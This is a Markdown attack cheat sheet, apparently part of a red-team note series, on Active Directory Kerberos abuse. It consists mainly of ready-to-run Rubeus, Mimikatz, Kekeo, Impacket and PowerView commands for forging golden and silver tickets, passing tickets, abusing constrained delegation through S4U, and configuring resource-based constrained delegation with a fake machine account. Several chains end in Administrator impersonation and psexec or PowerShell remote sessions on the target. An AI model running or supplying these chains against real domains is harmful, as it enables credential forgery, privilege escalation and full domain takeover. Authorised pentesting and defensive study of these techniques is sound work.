# 06 — Kerberos, Tickets and Delegation

> [!IMPORTANT]
> Kerberos delegation allows a service to impersonate a user when accessing downstream services. Misconfigured delegation settings (Unconstrained, Constrained, or Resource-Based Constrained Delegation) are primary targets for domain privilege escalation.

---

## Golden Ticket vs. Silver Ticket

| Property | Golden Ticket (TGT) | Silver Ticket (TGS) |
| :--- | :--- | :--- |
| **Target Object** | Entire Domain (TGT issued by KDC) | Specific Service / Computer (TGS) |
| **Required Key Material** | `krbtgt` account NTLM hash / AES256 key | Target Service Account NTLM hash / AES256 key |
| **KDC Contact Required?** | No (Presents forged TGT to KDC to request TGS) | No (Directly presents forged TGS to target service) |
| **Scope & Persistence** | Domain Admin access across all domain hosts | Privileged access to specific host/service only |
| **Detection Visibility** | High (DCSync required to dump `krbtgt`) | Low (Bypasses DC authentication logs) |

---

## Golden Ticket Creation

Golden Tickets forge a TGT signed with the `krbtgt` password key.

### Rubeus
```cmd
Rubeus.exe golden /aes256:<KRBTGT_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd
```

### Mimikatz
```text
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /ptt
```

### Impacket — ticketer
```bash
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<DC> -k -no-pass
```

---

## Silver Ticket Forgery

Forges a TGS for a specific Service Principal Name (SPN) using the service account's key.

### Rubeus
```cmd
Rubeus.exe silver /service:http/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
```

> [!WARNING]
> **WMI Silver Ticket:** To execute commands via WMI, tickets for **BOTH** `HOST` and `RPCSS` must be generated.

```cmd
Rubeus.exe silver /service:host/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
Rubeus.exe silver /service:rpcss/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
```

---

## Kerberos Delegation Overview

- **Unconstrained Delegation (UD):** The DC places a copy of the user's TGT inside the service ticket. The service extracts the TGT from LSASS and can impersonate the user anywhere.
- **Constrained Delegation (CD):** Restricts delegation to specific target SPNs (`msDS-AllowedToDelegateTo`). Allows protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`).
- **Resource-Based Constrained Delegation (RBCD):** Delegation permissions set on the target resource object itself (`msDS-AllowedToActOnBehalfOfOtherIdentity`).

---

## S4U Constrained Delegation Flow

Constrained delegation uses **S4U2self** (requests a service ticket to self on behalf of any user) and **S4U2proxy** (uses that ticket to request a service ticket to the allowed downstream service).

---

## Constrained Delegation Exploitation

### Enumerate
```powershell
Get-NetUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

### Rubeus S4U
```cmd
Rubeus.exe s4u /user:<DELEGATED_USER> /aes256:<AES256_KEY> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
```

### Kekeo + Mimikatz (Legacy)
```text
# Step 1: Ask TGT for delegated service account
kekeo # tgt::ask /user:<DELEGATED_USER> /domain:<DOMAIN> /password:<PASSWORD>

# Step 2: S4U TGS impersonating Domain Admin
kekeo # tgs::s4u /tgt:<TGT_FILE> /user:Administrator /service:cifs/<TARGET_FQDN>

# Step 3: Pass-the-Ticket
mimikatz # kerberos::ptt <TGS_TICKET_FILE>
```

### Post-Exploitation
```powershell
Enter-PSSession -ComputerName <TARGET_FQDN>
ls \\<TARGET_FQDN>\c$
```

---

## Resource-Based Constrained Delegation (RBCD)

If an attacker holds `GenericWrite` or `GenericAll` over a computer object, they can configure RBCD.

```powershell
# Step 1: Create a fake computer account (if machine account quota permits)
New-MachineAccount -MachineAccount 'FakeMachine$' -Password 'P@ss123!'

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer
Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{'msds-allowedtoactonbehalfofotheridentity'= <FAKE_MACHINE_SID_BYTES>}

# Step 3: Execute Rubeus S4U impersonating Domain Admin
Rubeus.exe s4u /user:FakeMachine$ /password:'P@ss123!' /impersonateuser:Administrator /msdsspn:cifs/<TARGET_COMPUTER> /ptt
```

### Impacket RBCD
```bash
# Configure RBCD
impacket-rbcd <DOMAIN>/<USER>:<PASSWORD> -delegate-to <TARGET_COMPUTER>$ -delegate-from FakeMachine$ -dc-ip <DC_IP> -action write

# S4U to get ticket
impacket-getST <DOMAIN>/FakeMachine$:'P@ss123!' -spn cifs/<TARGET_COMPUTER> -impersonate Administrator -dc-ip <DC_IP>
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<TARGET_COMPUTER> -k -no-pass
```
